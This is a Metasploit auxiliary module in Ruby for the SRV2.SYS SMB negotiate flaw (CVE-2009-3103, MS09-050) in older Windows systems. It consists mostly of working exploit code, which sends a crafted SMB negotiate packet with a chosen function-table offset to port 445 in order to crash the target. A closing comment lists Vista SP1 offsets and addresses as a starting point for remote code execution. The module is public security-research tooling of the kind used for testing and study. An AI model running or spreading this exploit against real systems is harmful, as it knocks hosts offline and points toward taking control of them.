##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference',
      'Description'    => %q{
        This module exploits an out of bounds function table dereference in the SMB
      request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7
      release candidates (not RTM), and Windows 2008 Server prior to R2.  Windows	Vista
      without SP1 does not seem affected by this flaw.
      },

      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'hdm' ],
      'License'        => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2009-3103'],
          ['BID', '36299'],
          ['OSVDB', '57799'],
          ['MSB', 'MS09-050'],
          ['URL', 'https://seclists.org/fulldisclosure/2009/Sep/0039.html'],
          ['URL', 'http://www.microsoft.com/technet/security/advisory/975497.mspx']
        ]
    ))
    register_options([
      Opt::RPORT(445),
      OptInt.new('OFFSET', [true, 'The function table offset to call', 0xffff])
    ])

  end


  def run
    connect()

    # The SMB 2 dialect must be there
    dialects = ['PC NETWORK PROGRAM 1.0', 'LANMAN1.0', 'Windows for Workgroups 3.1a', 'LM1.2X002', 'LANMAN2.1', 'NT LM 0.12', 'SMB 2.002']
    data     = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')

    pkt = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
    pkt['Payload']['SMB'].v['Flags1'] = 0x18
    pkt['Payload']['SMB'].v['Flags2'] = 0xc853
    pkt['Payload'].v['Payload']       = data

    pkt['Payload']['SMB'].v['ProcessIDHigh'] = datastore['OFFSET'].to_i
    pkt['Payload']['SMB'].v['ProcessID']     = 0
    pkt['Payload']['SMB'].v['MultiplexID']   = rand(0x10000)

    print_status("Sending request and waiting for a reply...")
    sock.put(pkt.to_s)
    r = sock.get_once

    if(not r)
      print_status("The target system has likely crashed")
    else
      print_status("Response received: #{r.inspect}")
    end

    disconnect()
  end
end

=begin

  Gaining code execution means pointing the offset to something that
  eventually causes us to run arbitrary code. The offsets below are
  a starting point for turning this into remote code execution.

  Offsets on Vista SP1 x64:
  0x1B = "SMB 2.002"
  0x1D = L"SMB2Validate"
  0x1E = L"SMB2Execute"
  0x31 = move eax, 0x00000002 + ret  # causes a hang when reaced
  0x58 = WmiQueryTraceInformation
  0x59 = WmiTraceMessage
  0x66 = ExAllocatePoolWithTag
  0x67 = ExFreePool
  0x76 = ExAllocatePoolWithTag
  0x77 = ExFreePool
  0x86 = ExAllocatePoolWithTag
  0x87 = ExFreePoo
  0x96 = ExAllocatePoolWithTag
  0x97 = ExFreePoo
  0xa6 = ExAllocatePoolWithTag
  0xa7 = ExFreePoo
  0xb9 = BugCheckEx
  0xc7 = SrvBalanceCredits
  0xdf = SrvNetStatistics data
  0xe0 = SrvNetStatisticsLock
  0x010e = SrvSnapShotScaevengerThread
  0x011c = SrvSnapShotScavengerTimer
  0x012a = SrvScavengerThread
  0x0138 = SrvScavengerTimer
  0x0146 = SrvScavengeDurableHandles
  0x0157 = SrvScavengeDurableHandlesTimer
  0x0166 = SrvProcessOplockBreaks
  0x0179 = SrvProcessOplockBreakTimer
  0x0185 = L"XactSrv"
  0x01f8 = WppTraceCallback


  Offsets on Vista SP1 (no updates) x86:

  0x64 = mov esp, ebp; pop ebp, ret
  0xde = pool with tag

  0 -> 99b51d6e - 8bff558bec5153568b75088b46308b98
  1 -> 99b55967 - 8bff558bec51518b45088b48308b8958
  2 -> 99b53e19 - 8bff558bec568b75088b4e7083791444
  3 -> 99b55811 - 8bff558bec5151538b5d088b43708378
  4 -> 99b53d54 - 8bff558bec56578b7d088b4770837814
  5 -> 99b54d41 - 8bff558bec83ec145356578b7d088b47
  6 -> 99b54c81 - 8bff558bec518b4d088b816c01000053
  7 -> 99b66c44 - 8bff558bec518b4d088b816c01000053
  8 -> 99b655bf - 8bff558bec518b55088b427083781471
  9 -> 99b63ce4 - 8bff558bec518b4d088b816c01000053
  10 -> 99b5a221 - 8bff558bec518b4d088b816c01000053
  11 -> 99b62996 - 8bff558bec518b4d088b816c01000053
  12 -> 99b5fab5 - 8bff558bec518b4d088b816c01000053
  25 -> 819aca26 - 6a2468d0988981e8960beeff33d28955
  26 -> 8186c78b - 8bff558bec83e4f86a008d451c50ff75
  62 -> 80d40f20 - 0000000000eb45000000000000000000
  116 -> 819273b7 - 8bff558bec83e4f883ec3c538b5d088b
  117 -> 8192739f - 8bff558bec6a00ff7508e8df0a00005d
  166 -> 819273b7 - 8bff558bec83e4f883ec3c538b5d088b
  167 -> 8192739f - 8bff558bec6a00ff7508e8df0a00005d
  194 -> 99b6b74c - 8bff558bec83ec0c0fb64d088b451c53
  195 -> 99b683f0 - 943018c0c6fd3f49a3e8697224f83f6f
  206 -> 99b5eeb5 - 8bff558bec83ec1ca11094b69953568b
  217 -> 99b5eea0 - 6a0168809ab699ff151880b699c21000
  226 -> 99b5211d - 8bff558bec83ec145356578d45f450c6
  231 -> 8192fcd0 - 0000000014fd9281ffffffff04000000
  237 -> 99b52108 - 6a0168009bb699ff151880b699c21000
  382 -> 8b137500 - 000000009075138b0000000000000000
  491 -> 8599b680 - 894518e82ee2ffff3b45087341ff7520
  646 -> c000009a - 0000ffffffff80040000ffffffff8004
  734 -> 802015ff - ffde03f078f8ff7f7c02f8ff3ffe01fe
  760 -> 99b4ff28 - 8bff558bec6a00ff7514ff7510ff750c
  804 -> 830ffc7d - 0000001722268b3e012004020010c01c


=end
